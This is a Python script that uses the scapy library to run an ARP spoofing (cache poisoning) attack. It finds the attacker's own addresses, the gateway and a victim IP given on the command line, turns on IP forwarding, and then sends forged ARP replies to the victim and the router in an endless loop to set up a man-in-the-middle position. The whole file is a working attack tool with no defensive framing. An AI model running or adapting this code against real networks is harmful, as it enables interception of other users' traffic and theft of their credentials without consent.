from scapy.all import *
import argparse
import sys
import time
import re
		
def poison(routerIP, victimIP, routerMAC, victimMAC):
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def main():
		
	reg1_ip = re.compile(r'inet addr:[0-9]{3}.[0-9]{3}.[0-9]{3}.[0-9]{3}')
	reg1_mac = re.compile(r'HWaddr .*\n')

	p = os.popen("ifconfig").read()
	attacker_ip = reg1_ip.findall(p)[0].split(':')[1]
	attacker_mac = reg1_mac.findall(p)[0].split(' ')[1]

	local_gw_ip = os.popen('route | awk "/default/ { print $2 } "').read()[16:29]

	print '[+] attacker_ip : ',attacker_ip
	print '[+] attacker_mac : ',attacker_mac

	gw_mac = ARP()
	gw_mac.pdst = local_gw_ip
	get_gw_mac = sr1(gw_mac)
	gw_mac = get_gw_mac.hwsrc

	print '[+] gw_ip : ', local_gw_ip
	print '[+] gw_mac : ',gw_mac

	
	victim_ip = sys.argv[1]#
	victim_mac = ARP()
	victim_mac.pdst = victim_ip#sys.argv[1]
	victim_mac = sr1(victim_mac)
	victim_mac = victim_mac.hwsrc

	print '[+] victim_ip : ',victim_ip
	print '[+] victim_mac : ',victim_mac
	
	if os.geteuid() != 0:
		print "[+] NOT Root!!!"
		quit()
	else:
		print "[+] Yes Root!!!"

	f = open('/proc/sys/net/ipv4/ip_forward', 'w')
	f.write('1\n')
	f.close()
	
	while True:
		poison(local_gw_ip, victim_ip, gw_mac, victim_mac)
		time.sleep(1.5)

if __name__ == "__main__":
	print "[+] Start_ARP!!"
	main()
